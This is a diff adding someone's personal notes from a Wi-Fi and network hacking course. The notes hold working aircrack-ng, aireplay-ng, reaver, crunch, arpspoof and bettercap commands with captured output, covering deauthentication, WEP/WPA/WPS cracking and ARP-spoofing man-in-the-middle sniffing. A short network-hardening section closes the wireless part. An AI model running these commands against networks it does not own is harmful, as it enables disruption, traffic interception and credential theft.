@@ -1,0 +1,354 @@
+Change MAC address
+	ifconfig 
+		ehter is the MAC address
+
+	> ifconfig wlan0 down
+	> ifconfig wlan0 hw ether 00:11:22:33:44:55
+	> ifconfig wlan0 up
+
+Enable monitor mode
+	> ifconfig wlan0 down
+	> airmon-ng check kill
+	> iwconfig wlan0 mode monitor
+	> ifconfig wlan0 up
+
+Packet Sniffing
+	> airodump-ng wlan0
+
+	H  1 ][ Elapsed: 42 s ][ 2020-04-14 11:44                                                                   
+		                                                                                                      
+	 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                              
+		                                                                                                      
+	 3A:9D:92:16:3D:BD  -28       29        0    0   6   65   WPA2 CCMP   PSK  DIRECT-9216BDBD                    
+	 D4:21:22:AE:99:4B  -37       94        3    0  11  130   WPA2 CCMP   PSK  Espresso                           
+	 D4:21:22:AE:99:4C  -35       95        0    0  11  130   OPN              Telekom_FON                        
+	 9C:C7:A6:F3:C7:29  -39       30        9    0   1  270   WPA  CCMP   PSK  FRITZ!Box 6360 Cable               
+	 82:C7:A6:F3:C7:29  -37       27        0    0   1  270   WPA  CCMP   PSK  FRITZ!Box Gastzugang               
+	 C8:0E:14:BE:35:70  -43       26       33    1   6  195   WPA2 CCMP   PSK  latte_macchiato
+
+	BSSID -> MAC.
+	PWR -> Signal strengh.
+	Beacons -> The network droadcast its existance.
+	#Data -> Number of data packages.
+	#/s -> Number of data packages the last 10 seconds.
+	CH -> Channel.
+	MB -> Max speed supported.
+	ENC -> Encryption used by the network.
+	CIPHER -> Cipher used in the network.
+	AUTH -> Auth used in the network.
+	ESSID -> Network Name.
+
+WIFI Bandwidth	2.4 or 5G
+	> airodump-ng wlan0			<- Only shows 2.4GHz
+	> airodump-ng --band a wlan0 		<- 5GHz
+	> airodump-ng --band -abg wlan0		<- Both 5 and 2.4 G, but slower.
+
+
+	> airodump-ng --band a wlan0      
+                                                                                                                          
+	 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                               
+		                                                                                                                       
+	 6C:55:E8:AE:FE:E8  -71        6        2    0 124 1733   WPA2 CCMP   PSK  ChiLLa Network                                      
+	 E8:DF:70:48:5F:57  -60        6        1    0 116 1170   WPA2 CCMP   PSK  FRITZ!Box 7490                                      
+	 BC:05:43:11:90:FB  -64        5        0    0 112  270   WPA2 CCMP   PSK  EM3                                                 
+	 C8:0E:14:BE:35:71  -27        6        0    0  60 1170   WPA2 CCMP   PSK  latte_macchiato
+
+Targeted Packet Sniffing (my router does both 2.4 and 5G and my interesting devices are on 5G)
+	> airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 --write test wlan0
+         
+	 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                             
+		                                                                                                                       
+	 C8:0E:14:BE:35:71  C0:EE:FB:2D:6C:AA  -24    0 - 6e     0        1                                                            
+	 C8:0E:14:BE:35:71  9C:B6:D0:EB:C8:89  -33    0 - 6e     0       24                                                            
+	 C8:0E:14:BE:35:71  6C:C7:EC:B0:9E:7E  -42    0 -24      0        1                                                            
+	 C8:0E:14:BE:35:71  28:C6:3F:16:E0:EF  -43    0 - 6e     0        2                                                            
+                                                      
+	BSSID -> MAC of devices connected to the network.
+	STATION -> Devices connected to the network.ls
+	PWR -> Signal strength.
+	Rate -> Speed.
+	Lost -> Data lost.
+	Frames -> Data captures.
+	Probe -> Are the devices still looking for network.
+
+	open wireshark to analyze the .cap file.
+                                    
+Deauthentication Attack:
+	Change MAC address to the MAC address of the client.
+	Tell routher I want to disconnect. 
+	Then client disconnects.
+
+	Then pretend to be the router by changing MAC address to the router.
+	Tell the client I am going to disconnect you.
+	
+	open two terminals and run:
+
+	> airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 wlan0
+	> aireplay-ng --deauth 10 -a C8:0E:14:BE:35:71 -c 9C:B6:D0:EB:C8:89 wlan0
+		- it didn't work with my Ubuntu-PC.
+	> sudo aireplay-ng -0 10 -a C8:0E:14:BE:35:71 -c C0:EE:FB:2D:6C:AA wlan0
+		- it works with my Android Phone.
+
+
+Cracking WEB Encryption			(I don't have WEB so this is untested)
+	IV is 24 bits 	
+	keyStream = IV + Password.
+	KeyStream + Data = Cipher.
+	The IV is small and sent in plaintext.
+	IV will be repeated on busy networks.
+
+	1. Capture a large number of packet/IVs.
+	> airodump-ng --bssid C8:0E:14:BE:35:71 --channel 1 --write basic_web wlan0
+
+	2. Analyze data and crack the key.
+	> aircrack-ng basic_web-01.cap -> KEY FOUND: SECRET.
+
+	if password was found but you can't see the ASCII password then
+	remove colons in the HEX password and use it instead.
+
+
+FAKE Authentification Attack
+	If network is not busy WEB cracking is slow.
+	Force AP to generate new IVs.
+	
+	1. Capture a packets with IVs.
+	> airodump-ng --bssid C8:0E:14:BE:35:71 --channel 1 --write arpreplay wlan0
+
+	2. Ask router to authenticate me.
+	> aireplay-ng --fakeauth 0 -a C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0
+
+	This send 1 package with an IV. We could do this many times.
+
+
+ARP Request Replay Attack		
+(Untested as I do not have WEB) (WARNING DO NOT COPY COMMAND FROM THIS SECTION)
+	Wait for an ARP packet.
+	Capture it and replay it.
+	Router is then forced to generate new packages with new IV's.
+	Keep doing this till we have enough IVs to crack the key.
+	
+	1. Capture a packets with IVs.
+	   I think this here makes the Network Adapter focus this network on this channel,
+	   so the 2. command with work.
+
+	> sudo airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 wlan0
+	
+	2. Ask router to authenticate me and thereby associate yourself with the network.
+	> aireplay-ng --fakeauth 0 -a C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0
+		
+	3. Run the AIP replay attack.
+	> aireplay-ng --aipreplay -b C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0
+
+	4. Analyze data and crack the key.
+	> aircrack-ng arpreplay-01.cap -> KEY FOUND: SECRET.
+
+
+WPA and WPA2 Cracking through WPS		
+	Sometimes they use WPS and that is easy crack.
+	The attack works if the router is not using Push-Button-Authentification.
+
+	1. Look for networks that use WPS:
+	> wash -i wlan0					(not working)
+
+	2. Ask router to authenticate me. 
+	   We do this so the router will not associate us and not ignore our messages.
+	   We want to associate with the target network every 30 seconds.
+
+	> sudo aireplay-ng --fakeauth 30 -a C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0
+
+	3. Run reaver that bruteforce the PIN.
+	   reaver is a script I downloaded - it is located in /Downloads
+	   -vvv for information
+	   --no-associate: we are already doing this.
+
+	> sudo ./reaver --bssid C8:0E:14:BE:35:71 --channel 60 --interface wlan0 -vvv --no-associate
+
+	[+] Switching wlan0 to channel 60
+	[+] Waiting for beacon from C8:0E:14:BE:35:71
+	[+] Associated with C8:0E:14:BE:35:71 (ESSID: latte_macchiato)
+	[+] Trying pin "12345670"
+	[+] Sending EAPOL START request                                                                                    
+	[!] WARNING: Receive timeout occurred 
+         
+	My Router has Push-Button_Authentification and therefore I get a timeout.
+	
+WPA and WPA2 Cracking by capturing handshake
+	The only packages that contain useful information are the handshake packages.
+
+	1. capture data from the target network
+	> sudo airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 --write wpa_handskake wlan0 
+         
+	2. Sit down and wait for the handshake to be captured or do a deauthentification attack.
+	   - Remember to look for probes to see if you got a handshake.
+	   - Or it is when they is something in the Notes column.
+
+	> sudo aireplay-ng -0 4 -a C8:0E:14:BE:35:71 -c C0:EE:FB:2D:6C:AA wlan0
+
+Creating Wordlist
+	Syntax:
+	> crunch min max characters -t pattern -o filename
+	Example:
+	> crunch 6 8 123abc$ -o wordlist -t a@@@@@b
+	
+	the -p option is for non repeating passwords.
+	
+	> crunch 6 8 adc12 -o test.txt
+	gives all posible combination
+
+Cracking WPA and WPA2
+	Requires a wordlist that includes the password.
+	
+	kali has wordlists in /usr/share/wordlists
+
+	I have generated my own wordlist called test.txt
+
+	> sudo aircrack-ng wpa_handshake-01.cap -w text.txt	
+
+
+                               Aircrack-ng 1.6 
+
+      [00:00:00] 20/2006210 keys tested (539.80 k/s) 
+
+      Time left: 1 hour, 2 minutes, 2 seconds                    0.00%
+
+                      KEY FOUND! [ secret ]
+
+
+      Master Key     : 19 78 82 AA 97 D5 95 84 2E 27 3F A6 77 10 A8 69 
+                       08 E8 83 DE AB AA 7F CC 4C E7 66 15 25 27 80 59 
+
+      Transient Key  : 37 16 49 4D 7B BD 66 D4 59 8A 9C 31 2B D0 FE 5B 
+                       CF C4 06 93 F1 DE 6E 0B 00 A6 04 A6 9D 01 82 1F 
+                       10 77 B6 D9 93 B0 B1 5F DE 9C 37 53 25 F1 BD D1 
+                       00 2B 0B C7 C4 06 D8 44 B5 48 69 C1 EE 7B 3C 04 
+
+      EAPOL HMAC     : 94 44 56 FD 9B 00 93 CC A3 3D 95 DF 04 D7 6C E3 
+
+
+Securing Network From Hackers
+	1. Dont use WEP	
+	2. On WPA/WPA2 
+		- If  WPS is enabled and then it is relatively quick to hack.
+			- Disable WPS.
+		- If WPS in not enabled then the only known way to hack is using a dictionary attack.
+			- Use a complex password, small, capitcal letters, symbols and numbers.
+
+
+	
+
+____________________________________________________________________________________________________
+
+
+Post Connection Attacts
+
+____________________________________________________________________________________________________
+
+
+
+Discover Devices on same NAN Network
+
+	> ifconfig
+	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+		inet 10.0.2.5  netmask 255.255.255.0  broadcast 10.0.2.255
+
+
+	My ip is 10.0.2.5.
+	I can only access IPs on the same subnet.
+
+	> sudo netdiscover -r 10.0.2.1/24
+
+	 Currently scanning: Finished!   |   Screen View: Unique Hosts                                               
+		                                                                                                     
+	 6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360                                             
+	 _____________________________________________________________________________
+	   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+	 -----------------------------------------------------------------------------
+	 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                            
+	 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                            
+	 10.0.2.3        08:00:27:10:56:4e      2     120  PCS Systemtechnik GmbH                                    
+	 10.0.2.15       08:00:27:e6:e5:59      2     120  PCS Systemtechnik GmbH
+	       
+
+Discover Devices on same WIFI Network
+	1. Unplug apdater
+	2. Start Kali VM
+	3. Plugin adapter.
+	4. Stop NAN Network Adapter.
+
+	* For me it only works with /16 on wifi.
+	> sudo ifconifg 
+	inet 192.168.178.34 
+	
+	> sudo netdiscover 192.168.178.1/16
+
+
+Zenmap
+	target: 192.168.178.1/24
+
+	Ping: 		fast
+	Quick Scan:	gives also information about open ports on each device.
+
+
+Man-In-The-Middle Attack
+	ARP SPOOFING
+		Information flow: Victim -> Hacker -> Access Point --> Internet.
+		In order for device to communicate inside the same network is carried out using the MAC.
+		ARP: Address Resolution Protocol.
+			Map IP address of a macine to it's MAC address.
+			Broadcast to all devices on network: WHO has IP 10.0.2.6?
+			All devices ignore message except the person with the right IP who will send its MAC.
+			Each computer has an ARP table.
+			>sudo arp -a
+			fritz.box (192.168.178.1) at c8:0e:14:be:35:6e [ether] on wlan0
+			OnePlus6.fritz.box (192.168.178.32) at c0:ee:fb:2d:6c:aa [ether] on wlan0
+			koller-XPS-13-9360.fritz.box (192.168.178.24) at 9c:b6:d0:eb:c8:89 [ether] on wlan0
+		* Send ARP Respone to Access point: I am the victim.
+		* Send ART Response to Victim: I am the Access point.
+
+		It is insecure because:
+			Cliets accept respone even when they didn't send a request.
+			There is no form of verification.
+
+		gateway IP:=92.168.178.1
+		> sudo arpspoof -i wlan0 -t clientIP gatewayIP
+		> sudo arpspoof -i wlan0 -t gatewayIP clientIP
+
+
+		> sudo arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+		> sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
+
+		enable port forwarding to enable hacker pc to serve as a router
+		> echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	BETTERCAP
+		Find devices on network
+
+			> sudo bettercap -iface eth0
+				>> help
+				List of modules.
+				>> help net.probe
+				Keep probing for new hosts on the network by sending dummy UDP packets
+				to every possible IP on the subnet.
+			   		net.probe on : Start network hosts probing in background.
+	  				net.probe off : Stop network hosts probing in background. 
+				>> net.probe.on
+				10.0.2.3 detected as 08:00:27:53:e4:4a (PCS Computer Systems GmbH).
+				10.0.2.15 detected as 08:00:27:e6:e5:59 (PCS Computer Systems GmbH).
+				>> net.show
+┌───────────┬───────────────────┬───────────────────┬─────────────────────────────────┬────────┬────────┬──────────┐
+│   IP ▴    │        MAC        │       Name        │             Vendor              │  Sent  │ Recvd  │   Seen   │
+├───────────┼───────────────────┼───────────────────┼─────────────────────────────────┼────────┼────────┼──────────┤
+│ 10.0.2.5  │ 08:00:27:87:f0:f3 │ eth0              │ PCS Computer Systems GmbH       │ 0 B    │ 0 B    │ 12:21:24 │
+│ 10.0.2.1  │ 52:54:00:12:35:00 │ gateway           │ Realtek (UpTech? also reported) │ 509 B  │ 320 B  │ 12:21:24 │
+│           │                   │                   │                                 │        │        │          │
+│ 10.0.2.3  │ 08:00:27:53:e4:4a │                   │ PCS Computer Systems GmbH       │ 2.5 kB │ 2.4 kB │ 12:26:21 │
+│ 10.0.2.15 │ 08:00:27:e6:e5:59 │ MSEDGEWIN10.local │ PCS Computer Systems GmbH       │ 2.5 kB │ 3.3 kB │ 12:26:22 │
+└───────────┴───────────────────┴───────────────────┴─────────────────────────────────┴────────┴────────┴──────────┘
+
+
+		ARP SPOOF using bettercap
+				>> net.probe.on
+				>> set arp.spoof.fulldubplix true
+				>> set arp.spoof.targets 10.0.2.15 
+				>> arp.spoof on
+				>> net.sniff on
